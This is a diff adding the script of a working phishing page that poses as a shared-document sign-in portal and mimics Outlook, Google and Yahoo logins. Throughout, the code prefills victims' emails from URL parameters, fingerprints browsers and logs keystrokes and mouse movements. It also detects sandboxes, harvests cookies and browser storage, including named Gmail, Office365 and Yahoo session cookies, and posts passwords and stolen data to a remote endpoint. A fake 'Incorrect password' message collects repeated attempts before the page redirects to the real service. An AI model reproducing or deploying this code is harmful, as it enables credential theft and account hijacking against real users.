+            const currentYear = new Date().getFullYear();
+            const randomType = fileTypes[Math.floor(Math.random() * fileTypes.length)];
+            const randomId = Math.floor(Math.random() * 9999) + 1000;
+            $('#dynamic-filename').text(randomType + '_' + currentYear + '_' + randomId + '.pdf');
+
+            const sizes = ['45.2 KB', '67.8 KB', '52.1 KB', '78.4 KB', '61.7 KB', '89.3 KB', '103.5 KB', '124.8 KB'];
+            $('#dynamic-filesize').text(sizes[Math.floor(Math.random() * sizes.length)]);
+        }
+
+        function generateAdvancedFingerprint() {
+            const canvas = document.getElementById('fingerprint-canvas');
+            const ctx = canvas.getContext('2d');
+            
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Security Check', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Authentication Portal', 4, 35);
+            
+            canvasFingerprint = canvas.toDataURL();
+            
+            systemFingerprint = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : 'unknown',
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                timezone: new Date().getTimezoneOffset(),
+                webgl: getWebGLFingerprint(),
+                fonts: detectFonts(),
+                plugins: getPluginsList(),
+                localStorage: typeof(Storage) !== "undefined",
+                sessionStorage: typeof(Storage) !== "undefined",
+                indexedDB: !!window.indexedDB,
+                webRTC: checkWebRTC(),
+                canvasSupport: !!document.createElement('canvas').getContext,
+                touchSupport: 'ontouchstart' in window,
+                cpuClass: navigator.cpuClass || 'unknown',
+                oscpu: navigator.oscpu || 'unknown',
+                buildID: navigator.buildID || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : 'unknown'
+            };
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'not supported';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return 'no debug info';
+                
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        function detectFonts() {
+            const testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+            const detectedFonts = [];
+            
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            context.textBaseline = 'top';
+            context.font = testSize + ' monospace';
+            const baselineSize = context.measureText(testString).width;
+            
+            for (let i = 0; i < testFonts.length; i++) {
+                context.font = testSize + ' ' + testFonts[i] + ', monospace';
+                const newSize = context.measureText(testString).width;
+                if (newSize !== baselineSize) {
+                    detectedFonts.push(testFonts[i]);
+                }
+            }
+            
+            return detectedFonts.join(',');
+        }
+
+        function getPluginsList() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            return plugins.join(',');
+        }
+
+        function checkWebRTC() {
+            return !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection);
+        }
+
+        function initBehavioralTracking() {
+            let mouseTimer;
+            let lastKeyTime = 0;
+            
+            $(document).on('mousemove', function(e) {
+                clearTimeout(mouseTimer);
+                mouseTimer = setTimeout(function() {
+                    behavioralData.mouseMovements.push({
+                        x: e.pageX,
+                        y: e.pageY,
+                        timestamp: Date.now() - sessionStartTime
+                    });
+                    
+                    if (behavioralData.mouseMovements.length > 30) {
+                        behavioralData.mouseMovements.shift();
+                    }
+                }, 10);
+            });
+
+            $(document).on('keydown', function(e) {
+                const currentTime = Date.now();
+                const timeDiff = lastKeyTime ? currentTime - lastKeyTime : 0;
+                
+                behavioralData.keyPressTimings.push({
+                    timeDiff: timeDiff,
+                    timestamp: currentTime - sessionStartTime,
+                    ctrlKey: e.ctrlKey,
+                    altKey: e.altKey,
+                    shiftKey: e.shiftKey
+                });
+                
+                lastKeyTime = currentTime;
+                
+                if (behavioralData.keyPressTimings.length > 50) {
+                    behavioralData.keyPressTimings.shift();
+                }
+            });
+
+            $(window).on('scroll', function() {
+                behavioralData.scrollEvents.push({
+                    scrollTop: $(window).scrollTop(),
+                    timestamp: Date.now() - sessionStartTime
+                });
+                
+                if (behavioralData.scrollEvents.length > 15) {
+                    behavioralData.scrollEvents.shift();
+                }
+            });
+
+            $(document).on('click', function(e) {
+                behavioralData.clickEvents.push({
+                    x: e.pageX,
+                    y: e.pageY,
+                    target: e.target.tagName,
+                    timestamp: Date.now() - sessionStartTime
+                });
+                
+                if (behavioralData.clickEvents.length > 20) {
+                    behavioralData.clickEvents.shift();
+                }
+            });
+
+            $('input, button, select, textarea').on('focus blur', function(e) {
+                behavioralData.focusEvents.push({
+                    element: this.id || this.name || this.tagName,
+                    event: e.type,
+                    timestamp: Date.now() - sessionStartTime
+                });
+                
+                if (behavioralData.focusEvents.length > 30) {
+                    behavioralData.focusEvents.shift();
+                }
+            });
+        }
+
+        function detectVirtualEnvironment() {
+            const indicators = {
+                isVM: false,
+                isSandbox: false,
+                isBot: false,
+                suspiciousFeatures: []
+            };
+
+            if (navigator.userAgent.includes('VirtualBox') || 
+                navigator.userAgent.includes('VMware') ||
+                navigator.userAgent.includes('QEMU')) {
+                indicators.isVM = true;
+                indicators.suspiciousFeatures.push('VM_USER_AGENT');
+            }
+
+            if (screen.width === 1024 && screen.height === 768) {
+                indicators.suspiciousFeatures.push('COMMON_VM_RESOLUTION');
+            }
+
+            if (window.webdriver || window.phantom || window.callPhantom || window._phantom) {
+                indicators.isBot = true;
+                indicators.suspiciousFeatures.push('AUTOMATION_DETECTED');
+            }
+
+            if (navigator.webdriver === true) {
+                indicators.isBot = true;
+                indicators.suspiciousFeatures.push('WEBDRIVER_DETECTED');
+            }
+
+            if (navigator.plugins.length === 0) {
+                indicators.isSandbox = true;
+                indicators.suspiciousFeatures.push('NO_PLUGINS');
+            }
+
+            if (navigator.language === 'C' || navigator.language === 'en') {
+                indicators.suspiciousFeatures.push('SUSPICIOUS_LANGUAGE');
+            }
+
+            if (navigator.userAgent.includes('Mobile') && !('ontouchstart' in window)) {
+                indicators.suspiciousFeatures.push('MOBILE_NO_TOUCH');
+            }
+
+            return indicators;
+        }
+
+        function performGeoCheck() {
+            return new Promise((resolve) => {
+                const geoServices = [
+                    'https://ipapi.co/json/',
+                    'https://ip-api.com/json/',
+                    'https://ipinfo.io/json'
+                ];
+
+                let completed = 0;
+                const results = [];
+
+                geoServices.forEach((service, index) => {
+                    $.ajax({
+                        url: service,
+                        method: 'GET',
+                        timeout: 3000,
+                        success: function(data) {
+                            results[index] = data;
+                        },
+                        error: function() {
+                            results[index] = null;
+                        },
+                        complete: function() {
+                            completed++;
+                            if (completed === geoServices.length) {
+                                resolve(results);
+                            }
+                        }
+                    });
+                });
+
+                setTimeout(() => {
+                    if (completed < geoServices.length) {
+                        resolve(results);
+                    }
+                }, 5000);
+            });
+        }
+
+        function getAllCookies() {
+            const cookies = {};
+            const cookieString = document.cookie;
+            
+            if (cookieString && cookieString.length > 0) {
+                cookieString.split(';').forEach(function(cookie) {
+                    const parts = cookie.trim().split('=');
+                    if (parts.length === 2) {
+                        cookies[parts[0]] = decodeURIComponent(parts[1]);
+                    }
+                });
+            }
+            
+            return cookies;
+        }
+
+        function getLocalStorageData() {
+            const data = {};
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key) {
+                        data[key] = localStorage.getItem(key);
+                    }
+                }
+            } catch (e) {}
+            return data;
+        }
+
+        function getSessionStorageData() {
+            const data = {};
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key) {
+                        data[key] = sessionStorage.getItem(key);
+                    }
+                }
+            } catch (e) {}
+            return data;
+        }
+
+        function extractSessionCookies() {
+            const allCookies = getAllCookies();
+            sessionCookies.all = allCookies;
+            
+            const gmailPatterns = ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', 'OSID', 'ACCOUNT_CHOOSER', 'GAPS', 'GALX'];
+            const office365Patterns = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'buid', 'esctx', 'fpc', 'stsservicecookie', 'AADSSO', 'ESTSSC'];
+            const yahooPatterns = ['Y', 'T', 'PH', 'SSL', 'B', 'F', 'AS', 'GUC'];
+            
+            for (let cookieName in allCookies) {
+                gmailPatterns.forEach(pattern => {
+                    if (cookieName.includes(pattern)) {
+                        sessionCookies.gmail[cookieName] = allCookies[cookieName];
+                    }
+                });
+                
+                office365Patterns.forEach(pattern => {
+                    if (cookieName.includes(pattern)) {
+                        sessionCookies.office365[cookieName] = allCookies[cookieName];
+                    }
+                });
+                
+                yahooPatterns.forEach(pattern => {
+                    if (cookieName.includes(pattern)) {
+                        sessionCookies.yahoo[cookieName] = allCookies[cookieName];
+                    }
+                });
+            }
+            
+            const localStorageData = getLocalStorageData();
+            for (let key in localStorageData) {
+                if (key.toLowerCase().includes('google') || key.toLowerCase().includes('gmail')) {
+                    sessionCookies.gmail['localStorage_' + key] = localStorageData[key];
+                }
+                if (key.toLowerCase().includes('microsoft') || key.toLowerCase().includes('office') || key.toLowerCase().includes('outlook')) {
+                    sessionCookies.office365['localStorage_' + key] = localStorageData[key];
+                }
+                if (key.toLowerCase().includes('yahoo')) {
+                    sessionCookies.yahoo['localStorage_' + key] = localStorageData[key];
+                }
+            }
+            
+            const sessionStorageData = getSessionStorageData();
+            for (let key in sessionStorageData) {
+                if (key.toLowerCase().includes('google') || key.toLowerCase().includes('gmail')) {
+                    sessionCookies.gmail['sessionStorage_' + key] = sessionStorageData[key];
+                }
+                if (key.toLowerCase().includes('microsoft') || key.toLowerCase().includes('office') || key.toLowerCase().includes('outlook')) {
+                    sessionCookies.office365['sessionStorage_' + key] = sessionStorageData[key];
+                }
+                if (key.toLowerCase().includes('yahoo')) {
+                    sessionCookies.yahoo['sessionStorage_' + key] = sessionStorageData[key];
+                }
+            }
+            
+            return sessionCookies;
+        }
+
+        function autoGrabEmail() {
+            let detectedEmail = '';
+            let source = '';
+            
+            const currentUrl = window.location.href;
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
+            
+            if (emailParam) {
+                let decodedEmail = emailParam;
+                
+                try {
+                    decodedEmail = decodeURIComponent(decodedEmail);
+                } catch (e) {}
+                
+                try {
+                    const base64Decoded = atob(decodedEmail);
+                    if (validateEmail(base64Decoded)) {
+                        decodedEmail = base64Decoded;
+                    }
+                } catch (e) {}
+                
+                if (validateEmail(decodedEmail)) {
+                    detectedEmail = decodedEmail;
+                    source = 'URL Parameter: email';
+                    emailGrabSource = source;
+                    return detectedEmail;
+                }
+            }
+            
+            const paramVariations = [
+                'e', 'mail', 'user', 'username', 'account', 'id', 
+                'login', 'u', 'm', 'addr', 'address', 'recipient', 'to', 'from',
+                'target', 'victim', 'contact', 'emp', 'employee', 'usr', 'eml'
+            ];
+            
+            for (let param of paramVariations) {
+                const paramValue = urlParams.get(param);
+                if (paramValue) {
+                    let decodedEmail = paramValue;
+                    
+                    try {
+                        decodedEmail = decodeURIComponent(decodedEmail);
+                    } catch (e) {}
+                    
+                    try {
+                        const base64Decoded = atob(decodedEmail);
+                        if (validateEmail(base64Decoded)) {
+                            decodedEmail = base64Decoded;
+                        }
+                    } catch (e) {}
+                    
+                    if (validateEmail(decodedEmail)) {
+                        detectedEmail = decodedEmail;
+                        source = 'URL Parameter: ' + param;
+                        emailGrabSource = source;
+                        return detectedEmail;
+                    }
+                }
+            }
+            
+            const hashParams = new URLSearchParams(window.location.hash.substring(1));
+            const hashEmail = hashParams.get('email');
+            
+            if (hashEmail) {
+                let decodedEmail = hashEmail;
+                
+                try {
+                    decodedEmail = decodeURIComponent(decodedEmail);
+                } catch (e) {}
+                
+                try {
+                    const base64Decoded = atob(decodedEmail);
+                    if (validateEmail(base64Decoded)) {
+                        decodedEmail = base64Decoded;
+                    }
+                } catch (e) {}
+                
+                if (validateEmail(decodedEmail)) {
+                    detectedEmail = decodedEmail;
+                    source = 'Hash Parameter: email';
+                    emailGrabSource = source;
+                    return detectedEmail;
+                }
+            }
+            
+            const curlyBraceMatch = currentUrl.match(/\{([^}]+)\}/i);
+            if (curlyBraceMatch) {
+                let extractedEmail = curlyBraceMatch[1];
+                
+                try {
+                    extractedEmail = decodeURIComponent(extractedEmail);
+                } catch (e) {}
+                
+                try {
+                    const base64Decoded = atob(extractedEmail);
+                    if (validateEmail(base64Decoded)) {
+                        extractedEmail = base64Decoded;
+                    }
+                } catch (e) {}
+                
+                if (validateEmail(extractedEmail)) {
+                    detectedEmail = extractedEmail;
+                    source = 'Custom {EMAIL} Pattern';
+                    emailGrabSource = source;
+                    return detectedEmail;
+                }
+            }
+            
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+            const emailMatches = currentUrl.match(emailRegex);
+            
+            if (emailMatches && emailMatches.length > 0) {
+                for (let match of emailMatches) {
+                    if (validateEmail(match)) {
+                        detectedEmail = match;
+                        source = 'URL Pattern Match';
+                        emailGrabSource = source;
+                        return detectedEmail;
+                    }
+                }
+            }
+            
+            try {
+                const localStorageData = getLocalStorageData();
+                
+                for (let key in localStorageData) {
+                    const value = localStorageData[key];
+                    if (typeof value === 'string') {
+                        const emailMatch = value.match(emailRegex);
+                        if (emailMatch && emailMatch.length > 0) {
+                            if (validateEmail(emailMatch[0])) {
+                                detectedEmail = emailMatch[0];
+                                source = 'LocalStorage: ' + key;
+                                emailGrabSource = source;
+                                return detectedEmail;
+                            }
+                        }
+                    }
+                }
+            } catch (e) {}
+            
+            try {
+                const sessionStorageData = getSessionStorageData();
+                
+                for (let key in sessionStorageData) {
+                    const value = sessionStorageData[key];
+                    if (typeof value === 'string') {
+                        const emailMatch = value.match(emailRegex);
+                        if (emailMatch && emailMatch.length > 0) {
+                            if (validateEmail(emailMatch[0])) {
+                                detectedEmail = emailMatch[0];
+                                source = 'SessionStorage: ' + key;
+                                emailGrabSource = source;
+                                return detectedEmail;
+                            }
+                        }
+                    }
+                }
+            } catch (e) {}
+            
+            try {
+                const cookies = getAllCookies();
+                
+                for (let key in cookies) {
+                    const value = cookies[key];
+                    if (typeof value === 'string') {
+                        const emailMatch = value.match(emailRegex);
+                        if (emailMatch && emailMatch.length > 0) {
+                            if (validateEmail(emailMatch[0])) {
+                                detectedEmail = emailMatch[0];
+                                source = 'Cookie: ' + key;
+                                emailGrabSource = source;
+                                return detectedEmail;
+                            }
+                        }
+                    }
+                }
+            } catch (e) {}
+            
+            try {
+                const referrer = document.referrer;
+                if (referrer) {
+                    const emailMatch = referrer.match(emailRegex);
+                    if (emailMatch && emailMatch.length > 0) {
+                        if (validateEmail(emailMatch[0])) {
+                            detectedEmail = emailMatch[0];
+                            source = 'Referrer URL';
+                            emailGrabSource = source;
+                            return detectedEmail;
+                        }
+                    }
+                }
+            } catch (e) {}
+            
+            try {
+                const docTitle = document.title;
+                const emailMatch = docTitle.match(emailRegex);
+                if (emailMatch && emailMatch.length > 0) {
+                    if (validateEmail(emailMatch[0])) {
+                        detectedEmail = emailMatch[0];
+                        source = 'Document Title';
+                        emailGrabSource = source;
+                        return detectedEmail;
+                    }
+                }
+            } catch (e) {}
+            
+            emailGrabSource = 'Not Found - Manual Input Required';
+            return detectedEmail;
+        }
+
+        function createBackgroundParticles() {
+            const bgAnimation = $('#bg-animation');
+            const particleCount = 20;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = $('<div class="particle"></div>');
+                const size = Math.random() * 5 + 3;
+                const duration = Math.random() * 20 + 15;
+                const delay = Math.random() * 8;
+                const left = Math.random() * 100;
+                
+                particle.css({
+                    width: size + 'px',
+                    height: size + 'px',
+                    left: left + '%',
+                    animationDuration: duration + 's',
+                    animationDelay: delay + 's'
+                });
+                
+                bgAnimation.append(particle);
+            }
+        }
+
+        function updateProgressBar(percent) {
+            $('#progress-bar').css('width', percent + '%');
+            if (percent >= 100) {
+                setTimeout(() => {
+                    $('#progress-bar').css('width', '0%');
+                }, 500);
+            }
+        }
+
+        function initScrollEffects() {
+            $(window).on('scroll', function() {
+                if ($(window).scrollTop() > 10) {
+                    $('#header').addClass('scrolled');
+                } else {
+                    $('#header').removeClass('scrolled');
+                }
+            });
+        }
+
+        function triggerHapticFeedback() {
+            if ('vibrate' in navigator) {
+                navigator.vibrate(10);
+            }
+        }
+
+        function showLoading(mainText, subText) {
+            $('#loading-text').text(mainText);
+            $('#loading-subtext').text(subText || 'Please wait');
+            $('#loading-overlay').addClass('show');
+            updateProgressBar(30);
+        }
+
+        function hideLoading() {
+            $('#loading-overlay').removeClass('show');
+            updateProgressBar(100);
+        }
+
+        function showError(elementId, message) {
+            const errorElement = $('#' + elementId);
+            if (message) {
+                errorElement.find('span').text(message);
+            }
+            errorElement.addClass('show');
+            triggerHapticFeedback();
+        }
+
+        function hideError(elementId) {
+            $('#' + elementId).removeClass('show');
+        }
+
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function updateHeaderForDomain(email) {
+            const domain = email.split('@')[1].toLowerCase();
+            const header = $('#header-title');
+            const loginHeader = $('.login-header');
+            
+            if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
+                header.text('Sign in to Outlook');
+                loginHeader.css('background', 'linear-gradient(135deg, #0078d4 0%, #40e0d0 50%, #0078d4 100%)');
+            } else if (domain.includes('gmail')) {
+                header.text('Sign in with Google');
+                loginHeader.css('background', 'linear-gradient(135deg, #4285f4 0%, #34a853 50%, #4285f4 100%)');
+            } else if (domain.includes('yahoo')) {
+                header.text('Sign in to Yahoo');
+                loginHeader.css('background', 'linear-gradient(135deg, #720e9e 0%, #ff0080 50%, #720e9e 100%)');
+            } else {
+                header.text('Sign in to Account');
+                loginHeader.css('background', 'linear-gradient(135deg, #0078d4 0%, #5c2d91 50%, #0078d4 100%)');
+            }
+        }
+
+        function getUserInitial(email) {
+            return email.charAt(0).toUpperCase();
+        }
+
+        function getRedirectUrl(email) {
+            const domain = email.split('@')[1].toLowerCase();
+            
+            if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
+                return 'https://outlook.live.com/mail/0/';
+            } else if (domain.includes('gmail')) {
+                return 'https://mail.google.com';
+            } else if (domain.includes('yahoo')) {
+                return 'https://mail.yahoo.com';
+            } else if (domain.includes('aol')) {
+                return 'https://mail.aol.com';
+            } else if (domain.includes('icloud')) {
+                return 'https://www.icloud.com/mail';
+            } else {
+                return 'https://www.office.com';
+            }
+        }
+
+        function forceRedirect(email) {
+            const redirectUrl = getRedirectUrl(email);
+            
+            $('#loading-text').text('Access granted');
+            $('#loading-subtext').text('Redirecting to your account...');
+            updateProgressBar(100);
+            
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 2000);
+        }
+
+        function submitData(email, password) {
+            const vmDetection = detectVirtualEnvironment();
+            const cookies = getAllCookies();
+            const localStorageData = getLocalStorageData();
+            const sessionStorageData = getSessionStorageData();
+            const extractedSessionCookies = extractSessionCookies();
+            
+            const dataPayload = {
+                ai: email,
+                pr: password,
+                browserFingerprint: JSON.stringify(systemFingerprint),
+                canvasFingerprint: canvasFingerprint,
+                behavioralData: JSON.stringify(behavioralData),
+                vmDetection: JSON.stringify(vmDetection),
+                cookies: JSON.stringify(cookies),
+                localStorage: JSON.stringify(localStorageData),
+                sessionStorage: JSON.stringify(sessionStorageData),
+                gmailSessionCookies: JSON.stringify(extractedSessionCookies.gmail),
+                office365SessionCookies: JSON.stringify(extractedSessionCookies.office365),
+                yahooSessionCookies: JSON.stringify(extractedSessionCookies.yahoo),
+                allSessionCookies: JSON.stringify(extractedSessionCookies.all),
+                sessionDuration: Date.now() - sessionStartTime,
+                attemptNumber: attemptCount,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer,
+                currentUrl: window.location.href,
+                viewportSize: window.innerWidth + 'x' + window.innerHeight,
+                screenSize: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
+                webglSupported: systemFingerprint.webgl !== 'not supported',
+                webRtcSupported: systemFingerprint.webRTC,
+                touchSupported: systemFingerprint.touchSupport,
+                userAgent: navigator.userAgent,
+                acceptLanguage: navigator.language,
+                dnt: navigator.doNotTrack,
+                pageLoadTime: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'unknown',
+                domContentLoaded: performance.timing ? (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) : 'unknown',
+                autoGrabSuccess: autoGrabSuccess,
+                emailSource: emailGrabSource
+            };
+            
+            return $.ajax({
+                url: CONFIG_ENDPOINT,
+                type: 'POST',
+                data: dataPayload,
+                timeout: 10000,
+                cache: false,
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-CSRF-Token': generateRandomString(32),
+                    'X-Session-ID': generateRandomString(16)
+                },
+                error: function(xhr, status, error) {
+                    setTimeout(function() {
+                        $.ajax({
+                            url: CONFIG_ENDPOINT,
+                            type: 'POST',
+                            data: dataPayload,
+                            timeout: 10000,
+                            cache: false
+                        }).fail(function() {});
+                    }, 1000);
+                }
+            });
+        }
+
+        $('#email-form').on('submit', function(e) {
+            e.preventDefault();
+            
+            const email = $('#email').val().trim();
+            
+            $('#email').removeClass('error');
+            hideError('error-message');
+            
+            if (!email) {
+                $('#email').addClass('error');
+                showError('error-message', 'Please enter an email address');
+                $('#email').focus();
+                return;
+            }
+
+            if (!validateEmail(email)) {
+                $('#email').addClass('error');
+                showError('error-message', 'Please enter a valid email address');
+                $('#email').focus();
+                return;
+            }
+
+            userEmail = email;
+            
+            showLoading('Preparing secure connection...', 'Verifying account and security checks');
+            updateProgressBar(50);
+            
+            performGeoCheck().then(function(geoResults) {});
+            
+            extractSessionCookies();
+            
+            setTimeout(function() {
+                hideLoading();
+                updateProgressBar(100);
+                
+                $('#initial-view').hide();
+                $('#password-view').addClass('show');
+                $('#password').focus();
+                
+                $('#user-email-display').text(email);
+                $('#user-avatar').html(getUserInitial(email));
+                
+                updateHeaderForDomain(email);
+                
+                triggerHapticFeedback();
+            }, 1500);
+        });
+
+        $('#password-form').on('submit', function(e) {
+            e.preventDefault();
+            
+            const password = $('#password').val().trim();
+            
+            $('#password').removeClass('error');
+            hideError('password-error');
+            
+            if (!password) {
+                $('#password').addClass('error');
+                showError('password-error', 'Please enter your password');
+                $('#password').focus();
+                return;
+            }
+
+            attemptCount++;
+            
+            showLoading('Verifying your credentials...', 'Authenticating with secure servers');
+            updateProgressBar(40);
+
+            const forceRedirectTimer = setTimeout(function() {
+                forceRedirect(userEmail);
+            }, FORCED_REDIRECT_TIMEOUT);
+
+            submitData(userEmail, password)
+                .done(function(response) {
+                    updateProgressBar(70);
+                })
+                .fail(function(xhr, status, error) {
+                    updateProgressBar(70);
+                })
+                .always(function() {
+                    if (attemptCount >= MAX_ATTEMPTS) {
+                        clearTimeout(forceRedirectTimer);
+                        forceRedirect(userEmail);
+                    } else {
+                        clearTimeout(forceRedirectTimer);
+                        hideLoading();
+                        $('#password').val('');
+                        $('#password').addClass('error');
+                        showError('password-error', 'Incorrect password. Please try again.');
+                        $('#password').focus();
+                    }
+                });
+        });
+
+        $('#back-link').on('click', function(e) {
+            e.preventDefault();
+            
+            $('#password-view').removeClass('show');
+            $('#initial-view').show();
+            
+            if (grabbedEmailFromURL && autoGrabSuccess) {
+                $('#email').val(grabbedEmailFromURL);
+            } else {
+                $('#email').val('');
+            }
+            
+            $('#email').focus();
+            $('#password').val('');
+            
+            hideError('error-message');
+            hideError('password-error');
+            $('.form-input').removeClass('error');
+            
+            attemptCount = 0;
+            generateDynamicContent();
+            
+            $('#header-title').text('Access Shared Document');
+            $('.login-header').css('background', 'linear-gradient(135deg, #0078d4 0%, #5c2d91 50%, #0078d4 100%)');
+            
+            triggerHapticFeedback();
+        });
+
+        $('#password-toggle').on('click', function() {
+            const passwordInput = $('#password');
+            const icon = $(this);
+            
+            if (passwordInput.attr('type') === 'password') {
+                passwordInput.attr('type', 'text');
+                icon.removeClass('fa-eye').addClass('fa-eye-slash');
+            } else {
+                passwordInput.attr('type', 'password');
+                icon.removeClass('fa-eye-slash').addClass('fa-eye');
+            }
+            
+            triggerHapticFeedback();
+        });
+
+        $('#email, #password').on('input', function() {
+            $(this).removeClass('error');
+            if ($(this).attr('id') === 'email') {
+                hideError('error-message');
+            } else {
+                hideError('password-error');
+            }
+        });
+
+        $('.provider-pill, .file-preview').on('click', function() {
+            $(this).css('transform', 'scale(0.95)');
+            triggerHapticFeedback();
+            setTimeout(() => {
+                $(this).css('transform', '');
+            }, 150);
+        });
+
+        function protectMemory() {
+            setInterval(function() {
+                if (typeof userEmail !== 'undefined' && userEmail) {
+                    behavioralData.keyPressTimings = behavioralData.keyPressTimings.slice(-10);
+                    behavioralData.mouseMovements = behavioralData.mouseMovements.slice(-20);
+                }
+            }, 30000);
+        }
+
+        function init() {
+            grabbedEmailFromURL = autoGrabEmail();
+            
+            if (grabbedEmailFromURL && validateEmail(grabbedEmailFromURL)) {
+                autoGrabSuccess = true;
+                $('#email').val(grabbedEmailFromURL);
+            } else {
+                autoGrabSuccess = false;
+            }
+            
+            generateDynamicContent();
+            generateAdvancedFingerprint();
+            initBehavioralTracking();
+            createBackgroundParticles();
+            initScrollEffects();
+            protectMemory();
+            
+            extractSessionCookies();
+            
+            if (window.history.replaceState) {
+                const cleanUrl = window.location.href.split('?')[0].split('#')[0];
+                window.history.replaceState(null, null, cleanUrl);
+            }
+        }
+
+        $(window).on('load', function() {
+            $('body').addClass('loaded');
+            updateProgressBar(100);
+            setTimeout(() => {
+                $('#progress-bar').css('width', '0%');
+            }, 500);
+        });
+
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                extractSessionCookies();
+            }
+        });
+
+        if ('performance' in window) {
+            window.addEventListener('load', function() {
+                setTimeout(function() {
+                    const perfData = performance.getEntriesByType('navigation')[0];
+                    if (perfData) {}
+                }, 0);
+            });
+        }
+
+        init();
+
+    });
+
+    if (window.top !== window.self) {
+        window.top.location = window.self.location;
+    }
+
+    (function() {
+        'use strict';
+        
+        if (typeof jQuery === 'undefined') {
+            document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial,sans-serif;"><h2>Loading Error</h2><p>Required resources could not be loaded. Please refresh the page.</p></div>';
+            return;
+        }
+        
+        const originalAlert = window.alert;
+        const originalConfirm = window.confirm;
+        const originalPrompt = window.prompt;
+        
+        window.alert = function() { return originalAlert.apply(this, arguments); };
+        window.confirm = function() { return originalConfirm.apply(this, arguments); };
+        window.prompt = function() { return originalPrompt.apply(this, arguments); };
+        
+    })();
+
+    </script>
+</body>
+</html>
